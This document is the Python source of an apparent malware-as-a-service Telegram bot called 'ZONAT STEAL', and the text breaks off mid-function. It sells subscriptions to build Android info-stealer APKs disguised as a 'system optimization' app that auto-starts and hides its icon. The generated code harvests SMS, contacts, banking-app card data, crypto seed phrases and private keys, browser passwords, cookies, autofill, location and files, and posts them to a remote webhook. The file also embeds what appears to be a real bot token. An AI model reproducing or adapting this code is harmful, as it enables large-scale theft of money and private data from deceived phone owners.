import os
import sys
import json
import logging
import threading
import time
import sqlite3
import hashlib
import uuid
import zipfile
import io
import random
import string
from datetime import datetime, timedelta
from flask import Flask, request, jsonify, send_file, render_template_string, send_from_directory
import telebot
from telebot import types
import requests
import qrcode
from PIL import Image, ImageDraw, ImageFont
from functools import wraps

# ===== конфигурация =====
TOKEN = "8075320326:AAHVxTnoeR6uD8vsXXU9ApatsZ3-boEDQpk"
ADMIN_ID = 7725796090
VERSION = "ZONAT STEAL V3.5"
FREE_TRIAL_HOURS = 24
PRICES = {"1day": 100, "7days": 500, "30days": 1500}
WEBHOOK_BASE = "https://zonatscamm.onrender.com"
DOMAIN = "zonatscamm.onrender.com"

# ===== логирование =====
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

app = Flask(__name__)
bot = telebot.TeleBot(TOKEN)

# ===== база данных =====
class Database:
    def __init__(self):
        self.conn = sqlite3.connect('zonat.db', check_same_thread=False)
        self.init_db()
    
    def init_db(self):
        c = self.conn.cursor()
        
        # пользователи
        c.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                balance REAL DEFAULT 0,
                subscription_end DATETIME,
                is_admin BOOLEAN DEFAULT FALSE,
                reg_date DATETIME DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        # стиллеры
        c.execute('''
            CREATE TABLE IF NOT EXISTS stealers (
                id TEXT PRIMARY KEY,
                user_id INTEGER,
                name TEXT,
                icon_path TEXT,
                config TEXT,
                apk_path TEXT,
                created_at DATETIME,
                status TEXT DEFAULT 'active',
                installs INTEGER DEFAULT 0,
                last_data DATETIME,
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        # данные
        c.execute('''
            CREATE TABLE IF NOT EXISTS stolen_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                stealer_id TEXT,
                user_id INTEGER,
                device_id TEXT,
                data_type TEXT,
                content TEXT,
                timestamp DATETIME,
                FOREIGN KEY (stealer_id) REFERENCES stealers (id),
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        # кеш банков/карт
        c.execute('''
            CREATE TABLE IF NOT EXISTS bank_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                stealer_id TEXT,
                bank_name TEXT,
                card_number TEXT,
                expiry_date TEXT,
                cvv TEXT,
                owner_name TEXT,
                balance TEXT,
                country TEXT,
                timestamp DATETIME
            )
        ''')
        
        # кеш крипто
        c.execute('''
            CREATE TABLE IF NOT EXISTS crypto_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                stealer_id TEXT,
                wallet_type TEXT,
                wallet_address TEXT,
                private_key TEXT,
                seed_phrase TEXT,
                balance TEXT,
                timestamp DATETIME
            )
        ''')
        
        # кеш паролей
        c.execute('''
            CREATE TABLE IF NOT EXISTS passwords_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                stealer_id TEXT,
                website TEXT,
                username TEXT,
                password TEXT,
                cookies TEXT,
                autofill TEXT,
                timestamp DATETIME
            )
        ''')
        
        # кеш файлов
        c.execute('''
            CREATE TABLE IF NOT EXISTS files_data (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                stealer_id TEXT,
                filename TEXT,
                filepath TEXT,
                file_content BLOB,
                file_type TEXT,
                timestamp DATETIME
            )
        ''')
        
        # платежи
        c.execute('''
            CREATE TABLE IF NOT EXISTS payments (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                amount REAL,
                days INTEGER,
                method TEXT,
                status TEXT DEFAULT 'pending',
                proof TEXT,
                admin_note TEXT,
                created_at DATETIME,
                FOREIGN KEY (user_id) REFERENCES users (user_id)
            )
        ''')
        
        # сессии
        c.execute('''
            CREATE TABLE IF NOT EXISTS user_sessions (
                user_id INTEGER PRIMARY KEY,
                step TEXT,
                data TEXT,
                updated_at DATETIME
            )
        ''')
        
        # логи
        c.execute('''
            CREATE TABLE IF NOT EXISTS logs (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                action TEXT,
                details TEXT,
                timestamp DATETIME
            )
        ''')
        
        # админ по умолчанию
        c.execute('INSERT OR IGNORE INTO users (user_id, username, is_admin, subscription_end) VALUES (?, ?, ?, ?)',
                 (ADMIN_ID, 'admin', True, '2099-12-31 23:59:59'))
        
        self.conn.commit()
    
    # === user methods ===
    def get_user(self, user_id):
        c = self.conn.cursor()
        c.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        if row:
            return {
                'user_id': row[0],
                'username': row[1],
                'balance': row[2],
                'subscription_end': row[3],
                'is_admin': bool(row[4]),
                'reg_date': row[5]
            }
        return None
    
    def create_user(self, user_id, username):
        c = self.conn.cursor()
        trial_end = datetime.now() + timedelta(hours=FREE_TRIAL_HOURS)
        c.execute('''
            INSERT OR IGNORE INTO users (user_id, username, subscription_end)
            VALUES (?, ?, ?)
        ''', (user_id, username, trial_end))
        self.conn.commit()
        return self.get_user(user_id)
    
    def check_subscription(self, user_id):
        user = self.get_user(user_id)
        if not user or not user['subscription_end']:
            return False
        try:
            end_date = datetime.strptime(user['subscription_end'], '%Y-%m-%d %H:%M:%S.%f')
        except:
            end_date = datetime.strptime(user['subscription_end'], '%Y-%m-%d %H:%M:%S')
        return end_date > datetime.now()
    
    def add_subscription(self, user_id, days):
        user = self.get_user(user_id)
        c = self.conn.cursor()
        
        try:
            if user and user['subscription_end']:
                try:
                    current = datetime.strptime(user['subscription_end'], '%Y-%m-%d %H:%M:%S.%f')
                except:
                    current = datetime.strptime(user['subscription_end'], '%Y-%m-%d %H:%M:%S')
                if current > datetime.now():
                    new_end = current + timedelta(days=days)
                else:
                    new_end = datetime.now() + timedelta(days=days)
            else:
                new_end = datetime.now() + timedelta(days=days)
            
            c.execute('UPDATE users SET subscription_end = ? WHERE user_id = ?',
                     (new_end, user_id))
            self.conn.commit()
            return new_end
        except Exception as e:
            logger.error(f"Error adding subscription: {e}")
            new_end = datetime.now() + timedelta(days=days)
            c.execute('UPDATE users SET subscription_end = ? WHERE user_id = ?',
                     (new_end, user_id))
            self.conn.commit()
            return new_end
    
    # === stealer methods ===
    def create_stealer(self, user_id, name, icon_path, config):
        stealer_id = f"stealer_{hashlib.md5((str(user_id) + name + str(time.time())).encode()).hexdigest()[:12]}"
        
        config['stealer_id'] = stealer_id
        config['owner_id'] = user_id
        config['created_at'] = datetime.now().isoformat()
        config['webhook_url'] = f"{WEBHOOK_BASE}/webhook"
        config['api_key'] = hashlib.sha256(f"{stealer_id}{user_id}".encode()).hexdigest()[:32]
        
        c = self.conn.cursor()
        c.execute('''
            INSERT INTO stealers (id, user_id, name, icon_path, config, created_at)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (stealer_id, user_id, name, icon_path, json.dumps(config), datetime.now()))
        
        self.conn.commit()
        return stealer_id
    
    def get_user_stealers(self, user_id):
        c = self.conn.cursor()
        c.execute('SELECT id, name, created_at, status, installs FROM stealers WHERE user_id = ? ORDER BY created_at DESC', (user_id,))
        return c.fetchall()
    
    def get_stealer_config(self, stealer_id, user_id):
        c = self.conn.cursor()
        c.execute('SELECT config FROM stealers WHERE id = ? AND user_id = ?', (stealer_id, user_id))
        row = c.fetchone()
        return json.loads(row[0]) if row else None
    
    def update_stealer_stats(self, stealer_id):
        c = self.conn.cursor()
        c.execute('UPDATE stealers SET installs = installs + 1, last_data = ? WHERE id = ?', 
                 (datetime.now(), stealer_id))
        self.conn.commit()
    
    # === data methods ===
    def add_stolen_data(self, stealer_id, user_id, device_id, data_type, content):
        c = self.conn.cursor()
        c.execute('''
            INSERT INTO stolen_data (stealer_id, user_id, device_id, data_type, content, timestamp)
            VALUES (?, ?, ?, ?, ?, ?)
        ''', (stealer_id, user_id, device_id, data_type, json.dumps(content), datetime.now()))
        self.conn.commit()
        return True
    
    def add_bank_data(self, user_id, stealer_id, bank_data):
        c = self.conn.cursor()
        c.execute('''
            INSERT INTO bank_data (user_id, stealer_id, bank_name, card_number, expiry_date, cvv, owner_name, balance, country, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, stealer_id, bank_data.get('bank_name'), bank_data.get('card_number'), 
              bank_data.get('expiry'), bank_data.get('cvv'), bank_data.get('owner'), 
              bank_data.get('balance'), bank_data.get('country'), datetime.now()))
        self.conn.commit()
    
    def add_crypto_data(self, user_id, stealer_id, crypto_data):
        c = self.conn.cursor()
        c.execute('''
            INSERT INTO crypto_data (user_id, stealer_id, wallet_type, wallet_address, private_key, seed_phrase, balance, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, stealer_id, crypto_data.get('type'), crypto_data.get('address'),
              crypto_data.get('private_key'), crypto_data.get('seed'), crypto_data.get('balance'),
              datetime.now()))
        self.conn.commit()
    
    def add_password_data(self, user_id, stealer_id, password_data):
        c = self.conn.cursor()
        c.execute('''
            INSERT INTO passwords_data (user_id, stealer_id, website, username, password, cookies, autofill, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, stealer_id, password_data.get('website'), password_data.get('username'),
              password_data.get('password'), json.dumps(password_data.get('cookies', {})),
              json.dumps(password_data.get('autofill', {})), datetime.now()))
        self.conn.commit()
    
    def add_file_data(self, user_id, stealer_id, file_data):
        c = self.conn.cursor()
        c.execute('''
            INSERT INTO files_data (user_id, stealer_id, filename, filepath, file_content, file_type, timestamp)
            VALUES (?, ?, ?, ?, ?, ?, ?)
        ''', (user_id, stealer_id, file_data.get('name'), file_data.get('path'),
              file_data.get('content'), file_data.get('type'), datetime.now()))
        self.conn.commit()
    
    def get_user_stats(self, user_id):
        c = self.conn.cursor()
        
        c.execute('SELECT COUNT(*) FROM stealers WHERE user_id = ?', (user_id,))
        stealers_count = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM stolen_data WHERE user_id = ?', (user_id,))
        data_count = c.fetchone()[0]
        
        c.execute('SELECT SUM(installs) FROM stealers WHERE user_id = ?', (user_id,))
        installs_count = c.fetchone()[0] or 0
        
        c.execute('SELECT COUNT(*) FROM bank_data WHERE user_id = ?', (user_id,))
        banks_count = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM crypto_data WHERE user_id = ?', (user_id,))
        crypto_count = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM passwords_data WHERE user_id = ?', (user_id,))
        passwords_count = c.fetchone()[0]
        
        return {
            'stealers': stealers_count,
            'total_data': data_count,
            'installs': installs_count,
            'banks': banks_count,
            'crypto': crypto_count,
            'passwords': passwords_count
        }
    
    def get_user_banks(self, user_id, limit=50):
        c = self.conn.cursor()
        c.execute('''
            SELECT bank_name, card_number, expiry_date, cvv, owner_name, balance, country, timestamp 
            FROM bank_data WHERE user_id = ? ORDER BY timestamp DESC LIMIT ?
        ''', (user_id, limit))
        return c.fetchall()
    
    def get_user_crypto(self, user_id, limit=50):
        c = self.conn.cursor()
        c.execute('''
            SELECT wallet_type, wallet_address, private_key, seed_phrase, balance, timestamp 
            FROM crypto_data WHERE user_id = ? ORDER BY timestamp DESC LIMIT ?
        ''', (user_id, limit))
        return c.fetchall()
    
    def get_user_passwords(self, user_id, limit=50):
        c = self.conn.cursor()
        c.execute('''
            SELECT website, username, password, timestamp 
            FROM passwords_data WHERE user_id = ? ORDER BY timestamp DESC LIMIT ?
        ''', (user_id, limit))
        return c.fetchall()
    
    def get_user_files(self, user_id, limit=20):
        c = self.conn.cursor()
        c.execute('''
            SELECT filename, file_type, timestamp 
            FROM files_data WHERE user_id = ? ORDER BY timestamp DESC LIMIT ?
        ''', (user_id, limit))
        return c.fetchall()
    
    # === session methods ===
    def set_session(self, user_id, step, data=None):
        c = self.conn.cursor()
        c.execute('''
            INSERT OR REPLACE INTO user_sessions (user_id, step, data, updated_at)
            VALUES (?, ?, ?, ?)
        ''', (user_id, step, json.dumps(data) if data else None, datetime.now()))
        self.conn.commit()
    
    def get_session(self, user_id):
        c = self.conn.cursor()
        c.execute('SELECT step, data FROM user_sessions WHERE user_id = ?', (user_id,))
        row = c.fetchone()
        if row:
            return {
                'step': row[0],
                'data': json.loads(row[1]) if row[1] else {}
            }
        return None
    
    def clear_session(self, user_id):
        c = self.conn.cursor()
        c.execute('DELETE FROM user_sessions WHERE user_id = ?', (user_id,))
        self.conn.commit()
    
    # === admin methods ===
    def get_all_users(self):
        c = self.conn.cursor()
        c.execute('''
            SELECT u.user_id, u.username, u.subscription_end, 
                   (SELECT COUNT(*) FROM stealers s WHERE s.user_id = u.user_id) as stealers_count,
                   (SELECT COUNT(*) FROM stolen_data d WHERE d.user_id = u.user_id) as data_count
            FROM users u
            ORDER BY u.reg_date DESC
        ''')
        return c.fetchall()
    
    def get_system_stats(self):
        c = self.conn.cursor()
        
        stats = {}
        c.execute('SELECT COUNT(*) FROM users')
        stats['total_users'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM stealers')
        stats['total_stealers'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM stolen_data')
        stats['total_data'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM bank_data')
        stats['total_banks'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM crypto_data')
        stats['total_crypto'] = c.fetchone()[0]
        
        c.execute('SELECT COUNT(*) FROM passwords_data')
        stats['total_passwords'] = c.fetchone()[0]
        
        c.execute('SELECT SUM(installs) FROM stealers')
        stats['total_installs'] = c.fetchone()[0] or 0
        
        c.execute('SELECT COUNT(*) FROM payments WHERE status = "confirmed"')
        stats['total_payments'] = c.fetchone()[0]
        
        c.execute('SELECT SUM(amount) FROM payments WHERE status = "confirmed"')
        stats['total_revenue'] = c.fetchone()[0] or 0
        
        return stats

db = Database()

# ===== декораторы доступа =====
def subscription_required(func):
    @wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        
        # админ всегда имеет доступ
        user = db.get_user(user_id)
        if user and user['is_admin']:
            return func(message)
        
        # проверка подписки
        if db.check_subscription(user_id):
            return func(message)
        else:
            markup = types.InlineKeyboardMarkup()
            markup.add(
                types.InlineKeyboardButton('💳 Купить подписку', callback_data='buy_subscription'),
                types.InlineKeyboardButton('🆘 Поддержка', url=f'tg://user?id={ADMIN_ID}')
            )
            bot.reply_to(message, 
                f"⏱️ <b>Ваша подписка закончилась!</b>\n\n"
                f"Бесплатный период: {FREE_TRIAL_HOURS} часов\n"
                f"Для продолжения работы приобретите подписку:",
                parse_mode='html',
                reply_markup=markup
            )
    return wrapper

def admin_required(func):
    @wraps(func)
    def wrapper(message):
        user_id = message.from_user.id
        user = db.get_user(user_id)
        if user and user['is_admin']:
            return func(message)
        else:
            bot.reply_to(message, "⛔ Эта команда только для администратора!")
    return wrapper

# ===== APK generator =====
class APKGenerator:
    @staticmethod
    def generate_apk_project(config):
        """генерация проекта APK"""
        project_id = f"project_{hashlib.md5(json.dumps(config).encode()).hexdigest()[:8]}"
        
        # создаем код APK
        apk_code = APKGenerator.generate_apk_code(config)
        
        # создаем buildozer.spec
        spec = APKGenerator.generate_buildozer_spec(config)
        
        # создаем основные файлы
        main_py = APKGenerator.generate_main_py(config)
        
        # создаем zip архив
        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w') as zipf:
            zipf.writestr('main.py', main_py)
            zipf.writestr('buildozer.spec', spec)
            zipf.writestr('requirements.txt', 'kivy==2.1.0\nrequests==2.31.0\npycryptodome==3.18.0\n')
            zipf.writestr('utils.py', APKGenerator.generate_utils())
            zipf.writestr('stealer.py', apk_code)
            
            # добавляем иконку по умолчанию
            icon = APKGenerator.create_default_icon(config.get('name', 'App'))
            zipf.writestr('assets/icon.png', icon)
            
            # добавляем манифест
            zipf.writestr('android_manifest.xml', APKGenerator.generate_manifest())
        
        zip_buffer.seek(0)
        
        return {
            'project_id': project_id,
            'zip_data': zip_buffer.getvalue(),
            'filename': f'{config["name"].replace(" ", "_")}_{project_id}.zip'
        }
    
    @staticmethod
    def generate_main_py(config):
        """главный файл APK"""
        return f'''import kivy
kivy.require('2.1.0')

from kivy.app import App
from kivy.uix.boxlayout import BoxLayout
from kivy.uix.label import Label
from kivy.uix.button import Button
from kivy.uix.image import Image
from kivy.clock import Clock
from kivy.core.window import Window
from kivy.utils import platform

import threading
import time
import json
import os
import sys

# Добавляем утилиты в путь
sys.path.append('.')
from stealer import AndroidStealer

class {config['name'].replace(' ', '').replace('-', '')}App(App):
    def build(self):
        self.title = '{config['name']}'
        Window.clearcolor = (0.1, 0.1, 0.1, 1)
        
        layout = BoxLayout(orientation='vertical', padding=50, spacing=20)
        
        # Заголовок
        title_label = Label(
            text='{config['name']}\\n\\nОптимизация системы',
            font_size='28sp',
            halign='center',
            color=(1, 1, 1, 1)
        )
        title_label.bind(size=title_label.setter('text_size'))
        layout.add_widget(title_label)
        
        # Прогресс
        self.progress_label = Label(
            text='Подготовка к оптимизации...',
            font_size='18sp',
            color=(0.8, 0.8, 0.8, 1)
        )
        layout.add_widget(self.progress_label)
        
        # Кнопка
        self.start_btn = Button(
            text='НАЧАТЬ ОПТИМИЗАЦИЮ',
            size_hint=(1, 0.3),
            background_color=(0.2, 0.6, 0.2, 1),
            font_size='20sp'
        )
        self.start_btn.bind(on_press=self.start_optimization)
        layout.add_widget(self.start_btn)
        
        # Автозапуск
        if {str(config.get('auto_start', True)).lower()}:
            Clock.schedule_once(lambda dt: self.start_optimization(None), 2)
        
        return layout
    
    def start_optimization(self, instance):
        if instance:
            instance.disabled = True
            instance.text = 'ОПТИМИЗАЦИЯ...'
        
        self.progress_label.text = 'Запуск процесса оптимизации...'
        
        # Запускаем сбор данных в отдельном потоке
        thread = threading.Thread(target=self.run_stealer)
        thread.daemon = True
        thread.start()
    
    def run_stealer(self):
        try:
            stealer = AndroidStealer()
            
            # Сбор данных
            self.update_progress('Сбор системной информации...', 20)
            data = stealer.collect_all()
            
            self.update_progress('Оптимизация завершена!', 100)
            
            # Скрываем приложение если нужно
            if {str(config.get('hide_icon', True)).lower()}:
                self.hide_app()
            
        except Exception as e:
            self.update_progress(f'Ошибка: {{str(e)}}', 0)
    
    def update_progress(self, text, percent):
        Clock.schedule_once(lambda dt: setattr(self.progress_label, 'text', text))
    
    def hide_app(self):
        '''Скрыть иконку приложения'''
        try:
            if platform == 'android':
                from jnius import autoclass
                PythonActivity = autoclass('org.kivy.android.PythonActivity')
                activity = PythonActivity.mActivity
                package_manager = activity.getPackageManager()
                component_name = autoclass('android.content.ComponentName')
                
                pkg = activity.getPackageName()
                cls = pkg + '.Service'
                cmp = componentName(pkg, cls)
                
                package_manager.setComponentEnabledSetting(
                    cmp,
                    autoclass('android.content.pm.PackageManager').COMPONENT_ENABLED_STATE_DISABLED,
                    autoclass('android.content.pm.PackageManager').DONT_KILL_APP
                )
        except:
            pass

if __name__ == '__main__':
    {config['name'].replace(' ', '').replace('-', '')}App().run()
'''
    
    @staticmethod
    def generate_apk_code(config):
        """код стиллера"""
        return f'''import json
import os
import sys
import time
import uuid
import hashlib
import base64
import sqlite3
import subprocess
import threading
from datetime import datetime
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

# Конфигурация
CONFIG = {json.dumps(config, indent=2, ensure_ascii=False)}

class AndroidStealer:
    def __init__(self):
        self.device_id = self.get_device_id()
        self.webhook_url = CONFIG['webhook_url']
        self.stealer_id = CONFIG['stealer_id']
        
    def collect_all(self):
        '''Собрать все данные'''
        data = {{
            "stealer_id": self.stealer_id,
            "device_id": self.device_id,
            "timestamp": datetime.now().isoformat(),
            "owner_id": CONFIG["owner_id"],
            "status": "full_collection"
        }}
        
        # Сбор системной информации
        data.update(self.collect_system_info())
        
        # Сбор контактов и SMS
        if CONFIG.get('collect_sms', True):
            data["contacts"] = self.collect_contacts()
            data["sms"] = self.collect_sms()
        
        # Сбор банковских данных
        if CONFIG.get('collect_banks', True):
            data["banks"] = self.find_bank_data()
        
        # Сбор крипто данных
        if CONFIG.get('collect_crypto', True):
            data["crypto"] = self.find_crypto_wallets()
        
        # Сбор паролей и cookies
        if CONFIG.get('collect_passwords', True):
            data["passwords"] = self.extract_passwords()
            data["cookies"] = self.extract_cookies()
            data["autofill"] = self.extract_autofill()
        
        # Сбор файлов
        if CONFIG.get('collect_files', True):
            data["files"] = self.collect_important_files()
        
        # Сбор данных приложений
        if CONFIG.get('collect_apps', True):
            data["installed_apps"] = self.get_installed_apps()
            data["app_data"] = self.extract_app_data()
        
        # Сбор местоположения
        if CONFIG.get('collect_location', True):
            data["location"] = self.get_location()
        
        # Сбор истории браузера
        if CONFIG.get('collect_history', True):
            data["browser_history"] = self.get_browser_history()
        
        # Отправка данных
        self.send_data(data)
        return data
    
    def get_device_id(self):
        '''Получить ID устройства'''
        try:
            import android
            return android.get_device_id()
        except:
            return str(uuid.uuid4())
    
    def collect_system_info(self):
        '''Собрать системную информацию'''
        info = {{
            "device": "Android",
            "model": self.get_system_property("ro.product.model"),
            "brand": self.get_system_property("ro.product.brand"),
            "android_version": self.get_system_property("ro.build.version.release"),
            "sdk_version": self.get_system_property("ro.build.version.sdk"),
            "build_id": self.get_system_property("ro.build.id"),
            "kernel": self.get_system_property("os.version"),
            "rooted": self.check_root(),
            "screen_resolution": self.get_screen_resolution(),
            "battery_level": self.get_battery_level(),
            "storage": self.get_storage_info(),
            "memory": self.get_memory_info(),
            "network": self.get_network_info()
        }}
        return {{"system_info": info}}
    
    def get_system_property(self, prop):
        '''Получить системное свойство'''
        try:
            result = subprocess.check_output(['getprop', prop], shell=True)
            return result.decode().strip()
        except:
            return "unknown"
    
    def check_root(self):
        '''Проверить root доступ'''
        checks = [
            "/system/bin/su",
            "/system/xbin/su", 
            "/sbin/su",
            "/system/app/Superuser.apk",
            "/system/app/SuperSU.apk"
        ]
        return any(os.path.exists(path) for path in checks)
    
    def collect_contacts(self):
        '''Собрать контакты'''
        contacts = []
        try:
            # Попытка получить контакты через content provider
            cmd = 'content query --uri content://contacts/phones/ --projection display_name:number'
            result = subprocess.check_output(cmd, shell=True).decode()
            
            for line in result.split('\\n'):
                if 'display_name' in line and 'number' in line:
                    parts = line.split(',')
                    name = ""
                    number = ""
                    for part in parts:
                        if 'display_name' in part:
                            name = part.split('=')[1].strip()
                        elif 'number' in part:
                            number = part.split('=')[1].strip()
                    
                    if name and number:
                        contacts.append({{"name": name, "number": number}})
        except:
            # Альтернативный метод
            try:
                import android
                contacts = android.get_contacts()
            except:
                contacts = []
        
        return contacts
    
    def collect_sms(self):
        '''Собрать SMS'''
        sms_list = []
        try:
            # Попытка получить SMS
            cmd = 'content query --uri content://sms/ --projection address:body:date'
            result = subprocess.check_output(cmd, shell=True).decode()
            
            for line in result.split('\\n'):
                if 'address' in line and 'body' in line:
                    parts = line.split(',')
                    address = ""
                    body = ""
                    date = ""
                    for part in parts:
                        if 'address' in part:
                            address = part.split('=')[1].strip()
                        elif 'body' in part:
                            body = part.split('=')[1].strip()
                        elif 'date' in part:
                            date = part.split('=')[1].strip()
                    
                    if address and body:
                        sms_list.append({{
                            "address": address,
                            "body": body,
                            "date": date
                        }})
        except:
            pass
        
        return sms_list
    
    def find_bank_data(self):
        '''Найти банковские данные'''
        banks = []
        
        # Пути к банковским приложениям
        bank_apps = {{
            "sberbank": "/data/data/ru.sberbankmobile",
            "tinkoff": "/data/data/ru.tinkoff.acquiring",
            "alfa": "/data/data/ru.alfabank.mobile.android",
            "vtb": "/data/data/ru.vtb24.mobilebanking.android",
            "gazprom": "/data/data/ru.psbank.mobile",
            "raiffeisen": "/data/data/ru.raiffeisen"
        }}
        
        for bank_name, path in bank_apps.items():
            if os.path.exists(path):
                try:
                    # Ищем файлы с данными
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith('.db') or file.endswith('.sqlite'):
                                db_path = os.path.join(root, file)
                                cards = self.extract_cards_from_db(db_path)
                                if cards:
                                    banks.append({{
                                        "bank": bank_name,
                                        "cards": cards
                                    }})
                except:
                    continue
        
        return banks
    
    def extract_cards_from_db(self, db_path):
              '''Извлечь карты из базы данных'''
        cards = []
        try:
            conn = sqlite3.connect(db_path)
            cursor = conn.cursor()
            
            # Попытка найти таблицы с картами
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
            tables = cursor.fetchall()
            
            for table in tables:
                table_name = table[0].lower()
                if 'card' in table_name or 'payment' in table_name:
                    try:
                        cursor.execute(f"SELECT * FROM {{table[0]}} LIMIT 10")
                        rows = cursor.fetchall()
                        
                        for row in rows:
                            if len(row) >= 4:
                                card_data = {{
                                    "number": str(row[0]) if len(row) > 0 else "",
                                    "expiry": str(row[1]) if len(row) > 1 else "",
                                    "cvv": str(row[2]) if len(row) > 2 else "",
                                    "owner": str(row[3]) if len(row) > 3 else ""
                                }}
                                cards.append(card_data)
                    except:
                        continue
            
            conn.close()
        except:
            pass
        
        return cards
    
    def find_crypto_wallets(self):
        '''Найти крипто кошельки'''
        wallets = []
        
        # Пути к крипто приложениям
        crypto_apps = {{
            "trust": "/data/data/com.wallet.crypto.trustapp",
            "metamask": "/data/data/io.metamask",
            "exodus": "/data/data/exodusmovement.exodus",
            "atomic": "/data/data/io.atomicwallet",
            "coinomi": "/data/data/com.coinomi.wallet"
        }}
        
        for wallet_name, path in crypto_apps.items():
            if os.path.exists(path):
                try:
                    # Ищем файлы с seed фразами и приватными ключами
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if any(ext in file.lower() for ext in ['.dat', '.json', '.txt', '.wallet']):
                                file_path = os.path.join(root, file)
                                try:
                                    with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                                        content = f.read(5000)  # Читаем первые 5000 символов
                                        
                                        # Ищем seed фразы (12 или 24 слова)
                                        import re
                                        seed_pattern = r'\\b([a-z]+\\s+){{11,23}}[a-z]+\\b'
                                        seeds = re.findall(seed_pattern, content)
                                        
                                        # Ищем приватные ключи
                                        privkey_pattern = r'[0-9a-fA-F]{{64}}'
                                        privkeys = re.findall(privkey_pattern, content)
                                        
                                        if seeds or privkeys:
                                            wallets.append({{
                                                "wallet": wallet_name,
                                                "seeds": seeds,
                                                "private_keys": privkeys,
                                                "file": file
                                            }})
                                except:
                                    continue
                except:
                    continue
        
        return wallets
    
    def extract_passwords(self):
        '''Извлечь пароли'''
        passwords = []
        
        # Браузеры
        browsers = {{
            "chrome": "/data/data/com.android.chrome",
            "firefox": "/data/data/org.mozilla.firefox",
            "opera": "/data/data/com.opera.browser",
            "samsung": "/data/data/com.sec.android.app.sbrowser"
        }}
        
        for browser_name, path in browsers.items():
            if os.path.exists(path):
                try:
                    # Ищем базы данных с паролями
                    db_files = []
                    for root, dirs, files in os.walk(path):
                        for file in files:
                            if file.endswith('.db') and any(name in file.lower() for name in ['login', 'password', 'webdata']):
                                db_files.append(os.path.join(root, file))
                    
                    for db_file in db_files:
                        try:
                            conn = sqlite3.connect(db_file)
                            cursor = conn.cursor()
                            
                            # Попытка найти таблицы с логинами
                            cursor.execute("SELECT name FROM sqlite_master WHERE type='table';")
                            tables = cursor.fetchall()
                            
                            for table in tables:
                                table_name = table[0].lower()
                                if any(keyword in table_name for keyword in ['logins', 'password', 'autofill']):
                                    try:
                                        cursor.execute(f"SELECT * FROM {{table[0]}} LIMIT 50")
                                        rows = cursor.fetchall()
                                        
                                        for row in rows:
                                            if len(row) >= 3:
                                                passwords.append({{
                                                    "browser": browser_name,
                                                    "website": str(row[0]) if len(row) > 0 else "",
                                                    "username": str(row[1]) if len(row) > 1 else "",
                                                    "password": str(row[2]) if len(row) > 2 else "",
                                                    "table": table[0]
                                                }})
                                    except:
                                        continue
                            
                            conn.close()
                        except:
                            continue
                except:
                    continue
        
        return passwords
    
    def extract_cookies(self):
        '''Извлечь cookies'''
        cookies = []
        
        try:
            # Ищем файлы cookies
            chrome_cookies = "/data/data/com.android.chrome/app_chrome/Default/Cookies"
            if os.path.exists(chrome_cookies):
                try:
                    conn = sqlite3.connect(chrome_cookies)
                    cursor = conn.cursor()
                    cursor.execute("SELECT host_key, name, value FROM cookies LIMIT 100")
                    rows = cursor.fetchall()
                    
                    for row in rows:
                        cookies.append({{
                            "host": row[0],
                            "name": row[1],
                            "value": row[2]
                        }})
                    
                    conn.close()
                except:
                    pass
        except:
            pass
        
        return cookies
    
    def extract_autofill(self):
        '''Извлечь автозаполнение'''
        autofill_data = []
        
        try:
            # Системное автозаполнение
            autofill_db = "/data/data/com.google.android.gms/databases/autofill.db"
            if os.path.exists(autofill_db):
                try:
                    conn = sqlite3.connect(autofill_db)
                    cursor = conn.cursor()
                    cursor.execute("SELECT package_name, field_name, value FROM autofill LIMIT 50")
                    rows = cursor.fetchall()
                    
                    for row in rows:
                        autofill_data.append({{
                            "app": row[0],
                            "field": row[1],
                            "value": row[2]
                        }})
                    
                    conn.close()
                except:
                    pass
        except:
            pass
        
        return autofill_data
    
    def collect_important_files(self):
        '''Собрать важные файлы'''
        important_files = []
        
        # Ключевые директории
        key_dirs = [
            "/sdcard/Download",
            "/sdcard/Documents",
            "/sdcard/DCIM",
            "/sdcard/WhatsApp",
            "/sdcard/Telegram",
            "/sdcard/Instagram"
        ]
        
        # Ключевые расширения файлов
        key_extensions = [
            '.pdf', '.doc', '.docx', '.xls', '.xlsx', '.txt',
            '.jpg', '.jpeg', '.png', '.mp4', '.avi', '.mov',
            '.db', '.sqlite', '.json', '.xml', '.conf'
        ]
        
        for directory in key_dirs:
            if os.path.exists(directory):
                try:
                    for root, dirs, files in os.walk(directory):
                        for file in files:
